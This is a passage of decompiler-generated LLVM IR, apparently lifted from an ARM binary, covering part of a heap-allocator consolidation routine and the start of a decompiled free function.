  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_128a0 = load i32, i32* @r4, align 4
  store i32 %v3_128a0, i32* %stack_var_-36, align 4
  %v0_128a4 = load i32, i32* @r0, align 4
  %v1_128a4 = inttoptr i32 %v0_128a4 to i32*
  %v2_128a4 = load i32, i32* %v1_128a4, align 4
  store i32 %v2_128a4, i32* %r3.global-to-local, align 4
  %v2_128a8 = icmp eq i32 %v2_128a4, 0
  store i32 %v0_128a4, i32* @r4, align 4
  br i1 %v2_128a8, label %dec_label_pc_129e0.preheader, label %dec_label_pc_128bc

dec_label_pc_129e0.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_129e825 = add i32 %v0_128a4, 52
  store i32 %v1_129e825, i32* %r3.global-to-local, align 4
  %v2_129f026 = add i32 %v0_128a4, 60
  %v3_129f027 = inttoptr i32 %v2_129f026 to i32*
  store i32 %v1_129e825, i32* %v3_129f027, align 4
  %v0_129f428 = load i32, i32* %r3.global-to-local, align 4
  %v2_129f429 = add i32 %v0_129f428, 12
  %v3_129f430 = inttoptr i32 %v2_129f429 to i32*
  store i32 %v0_129f428, i32* %v3_129f430, align 4
  br label %dec_label_pc_129e0.dec_label_pc_129e0_crit_edge

dec_label_pc_128bc:                               ; preds = %entry
  %v1_128bc = and i32 %v2_128a4, -3
  %v3_128c0 = udiv i32 %v2_128a4, 8
  store i32 %v3_128c0, i32* %r2.global-to-local, align 4
  store i32 %v1_128bc, i32* %v1_128a4, align 4
  %v0_128c8 = load i32, i32* @r0, align 4
  %v1_128c8 = add i32 %v0_128c8, -4
  store i32 %v1_128c8, i32* %r3.global-to-local, align 4
  %v1_128cc = load i32, i32* %r2.global-to-local, align 4
  %v4_128cc = mul i32 %v1_128cc, 4
  %v5_128cc = add i32 %v4_128cc, %v1_128c8
  store i32 %v5_128cc, i32* %sb.global-to-local, align 4
  %v1_128d0 = add i32 %v0_128c8, 52
  store i32 %v1_128d0, i32* %r7.global-to-local, align 4
  %v1_128d4 = add i32 %v0_128c8, 4
  store i32 %v1_128d4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_128dc

dec_label_pc_128dc:                               ; preds = %dec_label_pc_129d8, %dec_label_pc_128bc
  %v1_129d010 = phi i32 [ %v1_129d0, %dec_label_pc_129d8 ], [ %v5_128cc, %dec_label_pc_128bc ]
  %v1_128e8 = phi i32 [ %v1_129d8, %dec_label_pc_129d8 ], [ %v1_128d4, %dec_label_pc_128bc ]
  %v1_128dc = inttoptr i32 %v1_128e8 to i32*
  %v2_128dc = load i32, i32* %v1_128dc, align 4
  store i32 %v2_128dc, i32* %r1.global-to-local, align 4
  %v2_128e0 = icmp eq i32 %v2_128dc, 0
  br i1 %v2_128e0, label %dec_label_pc_129d0, label %dec_label_pc_128e8

dec_label_pc_128e8:                               ; preds = %dec_label_pc_128dc
  %v0_128e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_128e8, i32* %v1_128dc, align 4
  %v0_128ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_128ec

dec_label_pc_128ec:                               ; preds = %dec_label_pc_129c4, %dec_label_pc_128e8
  %v0_12908 = phi i32 [ %v0_129c4, %dec_label_pc_129c4 ], [ %v0_128ec.pre, %dec_label_pc_128e8 ]
  %v1_128ec = add i32 %v0_12908, 4
  %v2_128ec = inttoptr i32 %v1_128ec to i32*
  %v3_128ec = load i32, i32* %v2_128ec, align 4
  store i32 %v3_128ec, i32* %r3.global-to-local, align 4
  %v1_128f0 = and i32 %v3_128ec, -2
  store i32 %v1_128f0, i32* %lr.global-to-local, align 4
  %v2_128f4 = add i32 %v1_128f0, %v0_12908
  store i32 %v2_128f4, i32* @r0, align 4
  %v1_128f8 = urem i32 %v3_128ec, 2
  %v2_128f8 = icmp eq i32 %v1_128f8, 0
  %v1_128fc = add i32 %v0_12908, 8
  %v2_128fc = inttoptr i32 %v1_128fc to i32*
  %v3_128fc = load i32, i32* %v2_128fc, align 4
  store i32 %v3_128fc, i32* %sl.global-to-local, align 4
  %v1_12900 = add i32 %v2_128f4, 4
  %v2_12900 = inttoptr i32 %v1_12900 to i32*
  %v3_12900 = load i32, i32* %v2_12900, align 4
  store i32 %v3_12900, i32* %r8.global-to-local, align 4
  br i1 %v2_128f8, label %dec_label_pc_12908, label %dec_label_pc_1293c

dec_label_pc_12908:                               ; preds = %dec_label_pc_128ec
  %v1_12908 = inttoptr i32 %v0_12908 to i32*
  %v2_12908 = load i32, i32* %v1_12908, align 4
  store i32 %v2_12908, i32* %r5.global-to-local, align 4
  %v2_1290c = sub i32 %v0_12908, %v2_12908
  store i32 %v2_1290c, i32* %r3.global-to-local, align 4
  %v1_12910 = add i32 %v2_1290c, 8
  %v2_12910 = inttoptr i32 %v1_12910 to i32*
  %v3_12910 = load i32, i32* %v2_12910, align 4
  store i32 %v3_12910, i32* %ip.global-to-local, align 4
  %v1_12914 = add i32 %v3_12910, 12
  %v2_12914 = inttoptr i32 %v1_12914 to i32*
  %v3_12914 = load i32, i32* %v2_12914, align 4
  store i32 %v3_12914, i32* %r1.global-to-local, align 4
  %v9_12918 = icmp eq i32 %v3_12914, %v2_1290c
  %v1_1291c = add i32 %v2_1290c, 12
  %v2_1291c = inttoptr i32 %v1_1291c to i32*
  %v3_1291c = load i32, i32* %v2_1291c, align 4
  store i32 %v3_1291c, i32* %r2.global-to-local, align 4
  br i1 %v9_12918, label %dec_label_pc_12924, label %dec_label_pc_12980

dec_label_pc_12924:                               ; preds = %dec_label_pc_12908
  %v1_12924 = add i32 %v3_1291c, 8
  %v2_12924 = inttoptr i32 %v1_12924 to i32*
  %v3_12924 = load i32, i32* %v2_12924, align 4
  store i32 %v3_12924, i32* %r3.global-to-local, align 4
  %v9_12928 = icmp eq i32 %v3_12924, %v2_1290c
  br i1 %v9_12928, label %dec_label_pc_12930, label %dec_label_pc_12980

dec_label_pc_12930:                               ; preds = %dec_label_pc_12924
  store i32 %v3_12910, i32* %v2_12924, align 4
  %v0_12934 = load i32, i32* %r2.global-to-local, align 4
  %v1_12934 = load i32, i32* %ip.global-to-local, align 4
  %v2_12934 = add i32 %v1_12934, 12
  %v3_12934 = inttoptr i32 %v2_12934 to i32*
  store i32 %v0_12934, i32* %v3_12934, align 4
  %v0_12938 = load i32, i32* %lr.global-to-local, align 4
  %v1_12938 = load i32, i32* %r5.global-to-local, align 4
  %v2_12938 = add i32 %v1_12938, %v0_12938
  store i32 %v2_12938, i32* %lr.global-to-local, align 4
  %v0_12940.pre = load i32, i32* @r0, align 4
  %v0_12944.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_128ec, %dec_label_pc_12930
  %v0_129b4 = phi i32 [ %v1_128f0, %dec_label_pc_128ec ], [ %v2_12938, %dec_label_pc_12930 ]
  %v0_12944 = phi i32 [ %v3_12900, %dec_label_pc_128ec ], [ %v0_12944.pre, %dec_label_pc_12930 ]
  %v1_12958 = phi i32 [ %v2_128f4, %dec_label_pc_128ec ], [ %v0_12940.pre, %dec_label_pc_12930 ]
  %v0_1293c = load i32, i32* @r4, align 4
  %v1_1293c = add i32 %v0_1293c, 44
  %v2_1293c = inttoptr i32 %v1_1293c to i32*
  %v3_1293c = load i32, i32* %v2_1293c, align 4
  store i32 %v3_1293c, i32* %r3.global-to-local, align 4
  %v9_12940 = icmp eq i32 %v1_12958, %v3_1293c
  %v1_12944 = and i32 %v0_12944, -4
  store i32 %v1_12944, i32* %r5.global-to-local, align 4
  br i1 %v9_12940, label %dec_label_pc_129b4, label %dec_label_pc_1294c

dec_label_pc_1294c:                               ; preds = %dec_label_pc_1293c
  %v2_1294c = add i32 %v1_12958, %v1_12944
  store i32 %v2_1294c, i32* %r3.global-to-local, align 4
  %v1_12950 = add i32 %v2_1294c, 4
  %v2_12950 = inttoptr i32 %v1_12950 to i32*
  %v3_12950 = load i32, i32* %v2_12950, align 4
  store i32 %v3_12950, i32* %r3.global-to-local, align 4
  %v1_12954 = urem i32 %v3_12950, 2
  %v2_12954 = icmp eq i32 %v1_12954, 0
  %v2_12958 = add i32 %v1_12958, 4
  %v3_12958 = inttoptr i32 %v2_12958 to i32*
  store i32 %v1_12944, i32* %v3_12958, align 4
  br i1 %v2_12954, label %dec_label_pc_12960, label %dec_label_pc_1294c.dec_label_pc_12990_crit_edge

dec_label_pc_1294c.dec_label_pc_12990_crit_edge:  ; preds = %dec_label_pc_1294c
  %v0_12994.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12990

dec_label_pc_12960:                               ; preds = %dec_label_pc_1294c
  %v0_12960 = load i32, i32* @r0, align 4
  %v1_12960 = add i32 %v0_12960, 8
  %v2_12960 = inttoptr i32 %v1_12960 to i32*
  %v3_12960 = load i32, i32* %v2_12960, align 4
  store i32 %v3_12960, i32* %ip.global-to-local, align 4
  %v1_12964 = add i32 %v3_12960, 12
  %v2_12964 = inttoptr i32 %v1_12964 to i32*
  %v3_12964 = load i32, i32* %v2_12964, align 4
  store i32 %v3_12964, i32* %r3.global-to-local, align 4
  %v9_12968 = icmp eq i32 %v3_12964, %v0_12960
  %v1_1296c = add i32 %v0_12960, 12
  %v2_1296c = inttoptr i32 %v1_1296c to i32*
  %v3_1296c = load i32, i32* %v2_1296c, align 4
  store i32 %v3_1296c, i32* %r2.global-to-local, align 4
  br i1 %v9_12968, label %dec_label_pc_12974, label %dec_label_pc_12980

dec_label_pc_12974:                               ; preds = %dec_label_pc_12960
  %v1_12974 = add i32 %v3_1296c, 8
  %v2_12974 = inttoptr i32 %v1_12974 to i32*
  %v3_12974 = load i32, i32* %v2_12974, align 4
  store i32 %v3_12974, i32* %r3.global-to-local, align 4
  %v9_12978 = icmp eq i32 %v3_12974, %v0_12960
  br i1 %v9_12978, label %dec_label_pc_12984, label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %dec_label_pc_12960, %dec_label_pc_12924, %dec_label_pc_12908, %dec_label_pc_12974
  %v0_12980 = call i32 @abort()
  store i32 %v0_12980, i32* @r0, align 4
  %v0_12984.pre = load i32, i32* @ip, align 4
  %v1_12984.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12984

dec_label_pc_12984:                               ; preds = %dec_label_pc_12974, %dec_label_pc_12980
  %v1_12984 = phi i32 [ %v3_1296c, %dec_label_pc_12974 ], [ %v1_12984.pre, %dec_label_pc_12980 ]
  %v0_12984 = phi i32 [ %v3_12960, %dec_label_pc_12974 ], [ %v0_12984.pre, %dec_label_pc_12980 ]
  %v2_12984 = add i32 %v1_12984, 8
  %v3_12984 = inttoptr i32 %v2_12984 to i32*
  store i32 %v0_12984, i32* %v3_12984, align 4
  %v0_12988 = load i32, i32* %r2.global-to-local, align 4
  %v1_12988 = load i32, i32* %ip.global-to-local, align 4
  %v2_12988 = add i32 %v1_12988, 12
  %v3_12988 = inttoptr i32 %v2_12988 to i32*
  store i32 %v0_12988, i32* %v3_12988, align 4
  %v0_1298c = load i32, i32* %lr.global-to-local, align 4
  %v1_1298c = load i32, i32* %r5.global-to-local, align 4
  %v2_1298c = add i32 %v1_1298c, %v0_1298c
  store i32 %v2_1298c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12990

dec_label_pc_12990:                               ; preds = %dec_label_pc_1294c.dec_label_pc_12990_crit_edge, %dec_label_pc_12984
  %v0_12994 = phi i32 [ %v0_12994.pre, %dec_label_pc_1294c.dec_label_pc_12990_crit_edge ], [ %v2_1298c, %dec_label_pc_12984 ]
  %v0_12990 = load i32, i32* %r7.global-to-local, align 4
  %v1_12990 = add i32 %v0_12990, 8
  %v2_12990 = inttoptr i32 %v1_12990 to i32*
  %v3_12990 = load i32, i32* %v2_12990, align 4
  store i32 %v3_12990, i32* %r2.global-to-local, align 4
  %v1_12994 = or i32 %v0_12994, 1
  store i32 %v1_12994, i32* %r3.global-to-local, align 4
  %v0_12998 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12998, i32* %v2_12990, align 4
  %v0_1299c = load i32, i32* %r1.global-to-local, align 4
  %v1_1299c = load i32, i32* %r2.global-to-local, align 4
  %v2_1299c = add i32 %v1_1299c, 12
  %v3_1299c = inttoptr i32 %v2_1299c to i32*
  store i32 %v0_1299c, i32* %v3_1299c, align 4
  %v0_129a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_129a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_129a0 = add i32 %v1_129a0, %v0_129a0
  %v4_129a0 = inttoptr i32 %v3_129a0 to i32*
  store i32 %v0_129a0, i32* %v4_129a0, align 4
  %v0_129a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_129a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_129a4 = add i32 %v1_129a4, 4
  %v3_129a4 = inttoptr i32 %v2_129a4 to i32*
  store i32 %v0_129a4, i32* %v3_129a4, align 4
  %v0_129a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_129a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_129a8 = add i32 %v1_129a8, 8
  %v3_129a8 = inttoptr i32 %v2_129a8 to i32*
  store i32 %v0_129a8, i32* %v3_129a8, align 4
  %v0_129ac = load i32, i32* %r7.global-to-local, align 4
  %v1_129ac = load i32, i32* %r1.global-to-local, align 4
  %v2_129ac = add i32 %v1_129ac, 12
  %v3_129ac = inttoptr i32 %v2_129ac to i32*
  store i32 %v0_129ac, i32* %v3_129ac, align 4
  br label %dec_label_pc_129c4

dec_label_pc_129b4:                               ; preds = %dec_label_pc_1293c
  %v2_129b4 = add i32 %v1_12944, %v0_129b4
  %v1_129b8 = or i32 %v2_129b4, 1
  store i32 %v1_129b8, i32* %r3.global-to-local, align 4
  %v1_129bc = load i32, i32* %r1.global-to-local, align 4
  %v2_129bc = add i32 %v1_129bc, 4
  %v3_129bc = inttoptr i32 %v2_129bc to i32*
  store i32 %v1_129b8, i32* %v3_129bc, align 4
  %v0_129c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_129c0 = load i32, i32* @r4, align 4
  %v2_129c0 = add i32 %v1_129c0, 44
  %v3_129c0 = inttoptr i32 %v2_129c0 to i32*
  store i32 %v0_129c0, i32* %v3_129c0, align 4
  br label %dec_label_pc_129c4

dec_label_pc_129c4:                               ; preds = %dec_label_pc_12990, %dec_label_pc_129b4
  %v0_129c4 = load i32, i32* %sl.global-to-local, align 4
  %v2_129c4 = icmp eq i32 %v0_129c4, 0
  store i32 %v0_129c4, i32* %r1.global-to-local, align 4
  br i1 %v2_129c4, label %dec_label_pc_129d0.loopexit, label %dec_label_pc_128ec

dec_label_pc_129d0.loopexit:                      ; preds = %dec_label_pc_129c4
  %v0_129d0.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_129d0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %dec_label_pc_129d0.loopexit, %dec_label_pc_128dc
  %v1_129d0 = phi i32 [ %v1_129d0.pre, %dec_label_pc_129d0.loopexit ], [ %v1_129d010, %dec_label_pc_128dc ]
  %v0_129d8 = phi i32 [ %v0_129d0.pre, %dec_label_pc_129d0.loopexit ], [ %v1_128e8, %dec_label_pc_128dc ]
  %v9_129d0 = icmp eq i32 %v0_129d8, %v1_129d0
  br i1 %v9_129d0, label %dec_label_pc_12a48, label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129d0
  %v1_129d8 = add i32 %v0_129d8, 4
  store i32 %v1_129d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_128dc

dec_label_pc_129e0.dec_label_pc_129e0_crit_edge:  ; preds = %dec_label_pc_129e0.preheader, %dec_label_pc_129e0.dec_label_pc_129e0_crit_edge
  %v0_129e0.pre = load i32, i32* @r4, align 4
  %v1_129e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_129e0 = mul i32 %v1_129e0.pre, 8
  %v5_129e0 = add i32 %v4_129e0, %v0_129e0.pre
  %v1_129e4 = add i32 %v1_129e0.pre, 1
  store i32 %v1_129e4, i32* %r2.global-to-local, align 4
  %v1_129e8 = add i32 %v5_129e0, 44
  store i32 %v1_129e8, i32* %r3.global-to-local, align 4
  %v2_129f0 = add i32 %v5_129e0, 52
  %v3_129f0 = inttoptr i32 %v2_129f0 to i32*
  store i32 %v1_129e8, i32* %v3_129f0, align 4
  %v0_129f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_129f4 = add i32 %v0_129f4, 12
  %v3_129f4 = inttoptr i32 %v2_129f4 to i32*
  store i32 %v0_129f4, i32* %v3_129f4, align 4
  %v7_129f8 = icmp sgt i32 %v1_129e4, 95
  br i1 %v7_129f8, label %dec_label_pc_129fc, label %dec_label_pc_129e0.dec_label_pc_129e0_crit_edge

dec_label_pc_129fc:                               ; preds = %dec_label_pc_129e0.dec_label_pc_129e0_crit_edge
  %v0_129fc = load i32, i32* @r4, align 4
  %v1_129fc = inttoptr i32 %v0_129fc to i32*
  %v2_129fc = load i32, i32* %v1_129fc, align 4
  store i32 %v2_129fc, i32* %r2.global-to-local, align 4
  %v1_12a00 = add i32 %v0_129fc, 864
  %v2_12a00 = inttoptr i32 %v1_12a00 to i32*
  %v3_12a00 = load i32, i32* %v2_12a00, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12a08 = urem i32 %v2_129fc, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12a10 = or i32 %v3_12a00, 1
  store i32 %v1_12a10, i32* %r1.global-to-local, align 4
  %v1_12a14 = or i32 %v1_12a08, 72
  store i32 %v1_12a14, i32* %r2.global-to-local, align 4
  %v1_12a18 = add i32 %v0_129fc, 52
  store i32 %v1_12a18, i32* %ip.global-to-local, align 4
  %v2_12a1c = add i32 %v0_129fc, 840
  %v3_12a1c = inttoptr i32 %v2_12a1c to i32*
  store i32 0, i32* %v3_12a1c, align 4
  %v0_12a20 = load i32, i32* %r3.global-to-local, align 4
  %v1_12a20 = add i32 %v0_12a20, 65536
  store i32 %v1_12a20, i32* %r3.global-to-local, align 4
  %v0_12a24 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a24 = load i32, i32* @r4, align 4
  %v2_12a24 = add i32 %v1_12a24, 836
  %v3_12a24 = inttoptr i32 %v2_12a24 to i32*
  store i32 %v0_12a24, i32* %v3_12a24, align 4
  %v0_12a28 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a28 = load i32, i32* @r4, align 4
  %v2_12a28 = add i32 %v1_12a28, 844
  %v3_12a28 = inttoptr i32 %v2_12a28 to i32*
  store i32 %v0_12a28, i32* %v3_12a28, align 4
  %v1_12a2c = load i32, i32* @r4, align 4
  %v2_12a2c = add i32 %v1_12a2c, 852
  %v3_12a2c = inttoptr i32 %v2_12a2c to i32*
  store i32 %v1_12a20, i32* %v3_12a2c, align 4
  %v1_12a30 = load i32, i32* @r4, align 4
  %v2_12a30 = add i32 %v1_12a30, 864
  %v3_12a30 = inttoptr i32 %v2_12a30 to i32*
  store i32 %v1_12a10, i32* %v3_12a30, align 4
  %v1_12a34 = load i32, i32* @r4, align 4
  %v2_12a34 = inttoptr i32 %v1_12a34 to i32*
  store i32 %v1_12a14, i32* %v2_12a34, align 4
  %v0_12a38 = load i32, i32* %ip.global-to-local, align 4
  %v1_12a38 = load i32, i32* @r4, align 4
  %v2_12a38 = add i32 %v1_12a38, 44
  %v3_12a38 = inttoptr i32 %v2_12a38 to i32*
  store i32 %v0_12a38, i32* %v3_12a38, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12a40 = call i32 @sysconf(i32 30, i32 %v1_12a10, i32 %v1_12a14, i32 %v1_12a20)
  store i32 %v4_12a40, i32* @r0, align 4
  %v1_12a44 = load i32, i32* @r4, align 4
  %v2_12a44 = add i32 %v1_12a44, 860
  %v3_12a44 = inttoptr i32 %v2_12a44 to i32*
  store i32 %v4_12a40, i32* %v3_12a44, align 4
  br label %dec_label_pc_12a48

dec_label_pc_12a48:                               ; preds = %dec_label_pc_129d0, %dec_label_pc_129fc
  %v2_12a4c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12a4c, i32* @r4, align 4
  %v1_12a50 = load i32, i32* @r0, align 4
  ret i32 %v1_12a50

; uselistorder directives
  uselistorder i32 %v0_129fc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_129f4, { 1, 0 }
  uselistorder i32 %v1_129d8, { 1, 0 }
  uselistorder i32 %v0_129c4, { 0, 2, 1 }
  uselistorder i32 %v0_129a0, { 1, 0 }
  uselistorder i32 %v1_128f0, { 1, 0, 2 }
  uselistorder i32 %v0_12908, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_128c8, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 10, 0, 8, 9, 6, 7, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_12a48, { 1, 0 }
  uselistorder label %dec_label_pc_129e0.dec_label_pc_129e0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_129c4, { 1, 0 }
  uselistorder label %dec_label_pc_12990, { 1, 0 }
  uselistorder label %dec_label_pc_12984, { 1, 0 }
  uselistorder label %dec_label_pc_12980, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1293c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12a54 = load i32, i32* @r4, align 4
  %v6_12a54 = load i32, i32* @r5, align 4
  %v9_12a54 = load i32, i32* @r6, align 4
  %v12_12a54 = load i32, i32* @r7, align 4
  %v18_12a54 = load i32, i32* @lr, align 4
  %v0_12a5c = load i32, i32* @r0, align 4
  store i32 %v0_12a5c, i32* @r6, align 4
  %v2_12a5c = icmp eq i32 %v0_12a5c, 0
  %v2_12a60 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r7, align 4
  br i1 %v2_12a5c, label %dec_label_pc_12c68, label %dec_label_pc_12a6c

dec_label_pc_12a6c:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12a70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 108) to i32*), align 4
  store i32 %v4_12a70, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12a70, i32* %r2.global-to-local, align 4
  %v4_12a7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 68) to i32*), align 4
  store i32 %v4_12a7c, i32* %r1.global-to-local, align 4
  store i32 %v2_12a60, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12a88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), align 4
  store i32 %v4_12a88, i32* %ip.global-to-local, align 4
  store i32 76436, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12a88)
  %v0_12a94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12a94, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12a9c = load i32, i32* @r7, align 4
  %v2_12a9c = add i32 %v0_12a9c, 16
  %v3_12a9c = inttoptr i32 %v2_12a9c to i32*
  %v4_12a9c = load i32, i32* %v3_12a9c, align 4
  store i32 %v4_12a9c, i32* %ip.global-to-local, align 4
  store i32 76456, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12a9c)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12aac = load i32, i32* @r7, align 4
  %v2_12aac = add i32 %v0_12aac, 64
  %v3_12aac = inttoptr i32 %v2_12aac to i32*
  %v4_12aac = load i32, i32* %v3_12aac, align 4
  store i32 %v4_12aac, i32* @lr, align 4
  %v0_12ab0 = load i32, i32* @r6, align 4
  %v1_12ab0 = add i32 %v0_12ab0, -4
  %v2_12ab0 = inttoptr i32 %v1_12ab0 to i32*
  %v3_12ab0 = load i32, i32* %v2_12ab0, align 4
  store i32 %v3_12ab0, i32* %r2.global-to-local, align 4
  %v1_12ab4 = inttoptr i32 %v4_12aac to i32*
  %v2_12ab4 = load i32, i32* %v1_12ab4, align 4
  store i32 %v2_12ab4, i32* %r3.global-to-local, align 4
  %v1_12ab8 = and i32 %v3_12ab0, -4
  store i32 %v1_12ab8, i32* %ip.global-to-local, align 4
  %v1_12abc = add i32 %v0_12ab0, -8
  store i32 %v1_12abc, i32* @r5, align 4
  store i32 %v1_12abc, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12ab8, %v2_12ab4
  br i1 %tmp, label %dec_label_pc_12aec, label %dec_label_pc_12acc

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12a6c
  %v1_12acc = or i32 %v2_12ab4, 3
  store i32 %v1_12acc, i32* %r3.global-to-local, align 4
  store i32 %v1_12acc, i32* %v1_12ab4, align 4
  %v3_12ad0 = load i32, i32* @lr, align 4
  %v4_12ad0 = add i32 %v3_12ad0, -8
  store i32 %v4_12ad0, i32* %lr.global-to-local, align 4
  %v0_12ad4 = load i32, i32* %ip.global-to-local, align 4
  %v3_12ad4 = udiv i32 %v0_12ad4, 8
  store i32 %v3_12ad4, i32* %r1.global-to-local, align 4
  %v1_12ad8 = add i32 %v3_12ad0, -4
  store i32 %v1_12ad8, i32* %r2.global-to-local, align 4
  %v4_12adc = mul nuw i32 %v3_12ad4, 4
  %v5_12adc = add i32 %v4_12adc, %v1_12ad8
  %v6_12adc = inttoptr i32 %v5_12adc to i32*
  %v7_12adc = load i32, i32* %v6_12adc, align 4
  store i32 %v7_12adc, i32* %r3.global-to-local, align 4
  %v1_12ae0 = load i32, i32* @r5, align 4
  %v2_12ae0 = add i32 %v1_12ae0, 8
  %v3_12ae0 = inttoptr i32 %v2_12ae0 to i32*
  store i32 %v7_12adc, i32* %v3_12ae0, align 4
  %v0_12ae4 = load i32, i32* @r5, align 4
  %v1_12ae4 = load i32, i32* %r2.global-to-local, align 4
  %v2_12ae4 = load i32, i32* %r1.global-to-local, align 4
  %v5_12ae4 = mul i32 %v2_12ae4, 4
  %v6_12ae4 = add i32 %v5_12ae4, %v1_12ae4
  %v7_12ae4 = inttoptr i32 %v6_12ae4 to i32*
  store i32 %v0_12ae4, i32* %v7_12ae4, align 4
  br label %dec_label_pc_12c50

dec_label_pc_12aec:                               ; preds = %dec_label_pc_12a6c
  %v1_12aec = and i32 %v3_12ab0, 2
  %v2_12aec = icmp eq i32 %v1_12aec, 0
  br i1 %v2_12aec, label %dec_label_pc_12af4, label %dec_label_pc_12c28

dec_label_pc_12af4:                               ; preds = %dec_label_pc_12aec
  %v1_12af4 = or i32 %v2_12ab4, 1
  store i32 %v1_12af4, i32* %r3.global-to-local, align 4
  store i32 %v1_12af4, i32* %v1_12ab4, align 4
  %v0_12afc = load i32, i32* @r6, align 4
  %v1_12afc = add i32 %v0_12afc, -4
  %v2_12afc = inttoptr i32 %v1_12afc to i32*
  %v3_12afc = load i32, i32* %v2_12afc, align 4
  store i32 %v3_12afc, i32* %r3.global-to-local, align 4
  %v0_12b00 = load i32, i32* @r5, align 4
  %v1_12b00 = load i32, i32* %ip.global-to-local, align 4
  %v2_12b00 = add i32 %v1_12b00, %v0_12b00
  store i32 %v2_12b00, i32* %lr.global-to-local, align 4
  %v1_12b04 = urem i32 %v3_12afc, 2
  %v2_12b04 = icmp eq i32 %v1_12b04, 0
  %v1_12b08 = add i32 %v2_12b00, 4
  %v2_12b08 = inttoptr i32 %v1_12b08 to i32*
  %v3_12b08 = load i32, i32* %v2_12b08, align 4
  store i32 %v3_12b08, i32* %r8.global-to-local, align 4
  br i1 %v2_12b04, label %dec_label_pc_12b10, label %dec_label_pc_12b44

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12af4
  %v1_12b10 = add i32 %v0_12afc, -8
  %v2_12b10 = inttoptr i32 %v1_12b10 to i32*
  %v3_12b10 = load i32, i32* %v2_12b10, align 4
  store i32 %v3_12b10, i32* %r1.global-to-local, align 4
  %v2_12b14 = sub i32 %v0_12b00, %v3_12b10
  store i32 %v2_12b14, i32* %r3.global-to-local, align 4
  %v1_12b18 = add i32 %v2_12b14, 8
  %v2_12b18 = inttoptr i32 %v1_12b18 to i32*
